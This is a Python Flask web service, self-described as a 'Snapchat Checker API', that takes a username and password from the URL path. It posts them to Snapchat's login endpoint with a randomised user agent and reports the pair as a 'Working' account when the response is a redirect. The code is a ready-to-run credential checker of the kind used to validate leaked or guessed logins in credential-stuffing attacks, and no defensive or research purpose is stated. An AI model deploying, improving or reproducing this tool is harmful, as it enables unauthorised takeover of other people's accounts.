import os
import random
import requests
from flask import Flask, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

LOGIN_URL = "https://accounts.snapchat.com/accounts/login"

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    ]
    return random.choice(user_agents)

def check_snap_login(username, password):
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Referer": "https://accounts.snapchat.com/accounts/login",
    }
    payload = {
        "username": username,
        "password": password,
        "remember_me": "true",
    }
    try:
        session = requests.Session()
        response = session.post(LOGIN_URL, headers=headers, data=payload, allow_redirects=False, timeout=10)
        # 302 يعني تم تسجيل الدخول بنجاح
        return response.status_code == 302
    except:
        return False

# --- الرابط المطلوب ---

@app.route("/check/user/<username>/pass/<password>/", methods=["GET"])
def fast_check(username, password):
    """
    هذا الرابط يسمح بالفحص المباشر عبر المتصفح
    مثال: /check/user/myuser/pass/12345/
    """
    if not username or not password:
        return jsonify({"status": "error", "message": "Missing Data"}), 400

    is_valid = check_snap_login(username, password)

    if is_valid:
        return jsonify({
            "status": "success",
            "login": True,
            "account": f"{username}:{password}",
            "message": "✅ Account is Working!"
        })
    else:
        return jsonify({
            "status": "failed",
            "login": False,
            "message": "❌ Invalid or Blocked"
        })

@app.route("/", methods=["GET"])
def home():
    return "🚀 Snapchat Checker API is Online. Use /check/user/USERNAME/pass/PASSWORD/"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
